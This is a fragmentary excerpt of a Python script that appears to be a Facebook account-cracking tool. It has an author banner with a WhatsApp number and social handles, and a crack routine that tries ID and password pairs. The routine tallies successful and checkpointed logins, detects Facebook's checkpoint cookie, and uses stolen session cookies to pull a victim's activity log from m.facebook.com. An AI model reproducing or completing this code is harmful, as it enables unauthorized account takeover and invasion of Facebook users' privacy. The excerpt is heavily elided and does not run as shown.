...
"""%(N))                                                    
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Admin       : RANDY KNJUT
 [\x1b[1;96m+%s] WhatsApp   : 6281318304995
 [\x1b[1;96m+%s] Facebook   : MOMOK PINK
 [\x1b[1;96m+%s] Github      : https://github.com/Randygans11
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
def kontol():
    os.system("clear")
    print(f""" 
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [MOMOK-XD] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no'in taplikasi:
					...
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2025&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
